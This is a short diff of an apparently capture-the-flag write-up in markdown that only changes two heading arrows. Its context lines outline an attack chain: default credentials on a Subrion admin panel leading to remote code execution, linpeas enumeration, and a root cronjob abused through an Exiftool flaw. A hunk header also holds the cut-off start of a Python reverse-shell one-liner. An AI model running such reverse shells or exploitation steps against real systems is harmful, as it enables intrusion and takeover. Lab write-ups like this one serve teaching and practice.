@@ -40,7 +40,7 @@ PORT   STATE SERVICE VERSION
 
 So there's a `/panel` directory present, and we can enumerate that first:
 
-### Default Creds --> Subrion RCE
+### Default Creds -> Subrion RCE
 
 The `/panel` directory shows us a basic login page:
 
@@ -77,7 +77,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ## Privilege Escalation
 
-### Cronjob --> Exiftool RCE
+### Cronjob -> Exiftool RCE
 
 I ran `linpeas.sh` on the machine to enumerate for me, and it picked up on cronjobs running as the `root` user:
 
